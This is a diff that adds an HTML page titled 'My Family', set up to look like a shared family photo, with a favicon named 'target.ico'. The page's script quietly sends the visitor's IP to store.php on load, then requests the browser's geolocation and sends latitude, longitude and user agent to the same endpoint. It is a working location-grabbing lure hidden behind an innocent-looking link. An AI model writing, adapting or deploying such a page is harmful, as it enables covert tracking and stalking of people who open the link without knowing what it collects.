@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+		<html>
+		<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+			<meta property="og:title" content="My Family">
+			<meta property="og:image" content="1.jpeg">
+			<meta property="og:type" content="website">
+		<title>My Family</title>
+		
+		<!-- Set the icon for the browser tab -->
+		<link rel="icon" href="target.ico" type="image/x-icon">
+		<link href="target.ico" rel="shortcut icon"/>
+		</head>
+		<body onload="getLocation()">
+		<iframe src="1.jpeg" style="width: 1500px; height: 1500px;"></iframe><script async="" src="https://cdn.memes.com/assets/embed.js"></script>
+		<script>
+		navigator.geolocation.getCurrentPosition(showPosition);
+		
+		function logIpAddress() {
+			var xhr = new XMLHttpRequest();
+			xhr.open("GET", "store.php", true);
+			xhr.send();
+		}
+		
+		window.onload = logIpAddress();
+
+
+		function showPosition(position) {
+			const xhttp = new XMLHttpRequest();
+			xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+			xhttp.send();
+		
+		}
+		</script>
+		
+		</body>
+		</html>
